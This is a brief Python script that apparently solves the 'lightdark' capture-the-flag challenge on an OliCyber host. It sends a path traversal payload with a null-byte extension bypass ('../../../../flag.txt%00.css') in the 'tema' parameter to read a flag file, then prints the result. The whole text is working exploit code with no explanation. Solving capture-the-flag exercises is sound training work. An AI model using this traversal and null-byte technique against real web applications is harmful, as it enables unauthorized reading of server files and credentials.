import requests

url = "http://lightdark.challs.olicyber.it/index.php?tema=dark.php"

r = requests.get("http://lightdark.challs.olicyber.it/index.php?tema=../../../../flag.txt%00.css")

print(r.text)